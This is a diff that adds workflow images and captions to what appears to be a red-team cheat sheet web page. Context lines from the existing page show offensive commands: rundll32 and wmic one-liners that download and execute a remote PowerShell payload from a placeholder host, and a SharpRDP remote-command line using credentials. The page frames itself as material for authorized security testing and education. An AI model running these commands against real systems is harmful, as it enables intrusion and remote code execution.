@@ -79,6 +79,9 @@
 		.info-box { background: #e3f2fd; border-left: 4px solid #2196f3; padding: 20px; border-radius: 0 8px 8px 0; margin: 25px 0; }
 		.info-box p { margin: 0; color: #1565c0; }
 
+		.article-body img { max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+		.image-caption { text-align: center; font-size: 14px; color: #666; margin-top: -10px; margin-bottom: 20px; font-style: italic; }
+
 		footer { background: #1a1a2e; color: #fff; padding: 30px 0; text-align: center; margin-top: 60px; }
 		footer p { margin: 0; opacity: 0.8; }
 
@@ -154,6 +157,10 @@
 				<p><strong>Disclaimer:</strong> This cheat sheet is for authorized security testing and educational purposes only. Always obtain proper authorization before conducting security assessments.</p>
 			</div>
 
+			<h3>Red Team Operation Overview</h3>
+			<img src="../iamges/redteamcheatsheet/5453bcef-e6ea-4f53-a1e0-cb9f6e3eae2c.png" alt="Red Team Operation Phases">
+			<p class="image-caption">Complete red team operation workflow - from reconnaissance to reporting</p>
+
 			<h2 id="reconnaissance">Reconnaissance</h2>
 
 			<h3>Passive Reconnaissance</h3>
@@ -220,6 +227,9 @@ whatweb http://target.com
 nuclei -u http://target.com -t cves/</code></pre>
 
 			<h2 id="initial-access">Initial Access</h2>
+
+			<img src="../iamges/redteamcheatsheet/462355dc-5370-4cec-925b-f2558869d20d.png" alt="Initial Access and Payload Delivery">
+			<p class="image-caption">Initial access and payload delivery workflow</p>
 
 			<h3>Phishing</h3>
 
@@ -291,6 +301,9 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http
 wmic process call create "powershell -ep bypass -c IEX(IWR http://IP/payload.ps1)"</code></pre>
 
 			<h2 id="persistence">Persistence</h2>
+
+			<img src="../iamges/redteamcheatsheet/38da70f2-c0f5-4ba4-8b5c-809884878186.png" alt="Persistence and Defense Evasion">
+			<p class="image-caption">Persistence and defense evasion techniques workflow</p>
 
 			<h3>Registry Run Keys</h3>
 			<pre><code># Current user
@@ -543,6 +556,9 @@ mstsc.exe /restrictedadmin
 SharpRDP.exe computername=TARGET command="powershell -c IEX(...)" username=DOMAIN\User password=Password</code></pre>
 
 			<h2 id="collection">Collection & Exfiltration</h2>
+
+			<img src="../iamges/redteamcheatsheet/7ba47d2f-d2e0-433e-998f-6ec9fcacac42.png" alt="Collection Exfiltration and Cleanup">
+			<p class="image-caption">Collection, exfiltration, and cleanup workflow</p>
 
 			<h3>Data Collection</h3>
 			<pre><code># Find sensitive files
